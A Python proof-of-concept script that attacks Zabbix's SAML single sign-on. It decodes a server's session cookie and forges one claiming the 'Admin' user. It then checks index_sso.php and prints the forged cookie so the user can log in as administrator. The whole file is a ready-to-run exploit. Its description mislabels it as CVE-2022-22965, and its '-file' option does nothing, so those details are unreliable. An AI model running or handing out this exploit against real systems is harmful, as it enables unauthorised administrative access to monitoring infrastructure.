import requests
import re
import argparse
import base64,urllib.parse
import json

def decode(para):
    para = urllib.parse.unquote(para,encoding="utf-8")
    base64_decode = base64.b64decode(para)
    para_json = json.loads(base64_decode)
    return para_json

def verify(url,payload):
    url = url+'/index_sso.php?form=default'
    cookie = payload
    payload = {'zbx_session':payload}
    res = requests.get(url=url,cookies=payload,verify=False)
    re = 'icon-monitoring'
    flag = re in str(res.text)

    if flag:
        print("It looks likely vulnerable")
        print("And please use this cookie "+ '{\33[91m'+ cookie + '\33[0m}' +" to login zabbix~")
    else:
        print("It is strong")

def exploit(url):
    url = 'http://'+url+'/zabbix'
    response = requests.get(url=url,verify=False)
    cookie = response.headers.get('Set-Cookie')
    para1 = re.compile('zbx_session=(.*?);')
    para2 = re.findall(para1,cookie)[0]
    para = decode(para2)
    payload = '{"saml_data":{"username_attribute":"Admin"},"sessionid":'+'"'+para['sessionid']+'"'+',"sign":'+'"'+para['sign']+'"'+'}'
    payload_encode = urllib.parse.quote(base64.b64encode(payload.encode()))
    verify(url,payload_encode)

if __name__ == '__main__':
    parameter = argparse.ArgumentParser(description='Poc CVE-2022-22965:')
    parameter.add_argument('-file',help='url file',required=False)
    parameter.add_argument('-url',help='ip:port',required=False)
    para = parameter.parse_args()

    if para.url:
        exploit(para.url)
        exit()
    else:
        parameter.print_help()
